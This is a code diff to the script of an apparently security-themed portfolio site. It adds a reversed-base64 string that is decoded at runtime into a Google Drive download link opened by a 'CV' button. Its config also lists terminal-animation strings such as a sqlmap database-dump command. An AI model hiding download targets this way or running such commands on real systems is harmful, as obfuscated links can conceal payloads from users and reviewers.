@@ -10,13 +10,17 @@ const CONFIG = {
         "sqlmap -u 'url' --dbs",
         "whoami && id"
     ],
-
     excluded_repos: [
         "nullcranium",
         "nullcranium.github.io",
 
-    ]
+    ],
+    _r: "=QMqdjVvR2clBHchxWYlR3c39yL6MHc0RHa"
 };
+
+const _d = (s) => atob(s.split('').reverse().join(''));
+const _g = () => { const p = "https://drive.google.com/uc?export=download&id="; return p + _d(CONFIG._r); };
+
 let terminalAnimationRunning = false;
 let terminalInterval = null;
 
@@ -185,6 +189,8 @@ document.addEventListener('DOMContentLoaded', () => {
     // animateTerminal();
     fetchRepos();
 
+    const cvBtn = document.getElementById('cv-download-btn');
+    if (cvBtn) { cvBtn.addEventListener('click', () => window.open(_g(), '_blank')); }
     const mobileMenuBtn = document.getElementById('mobile-menu-btn');
     const navMenu = document.getElementById('nav-menu');
     const navLinks = document.querySelectorAll('.nav-link');
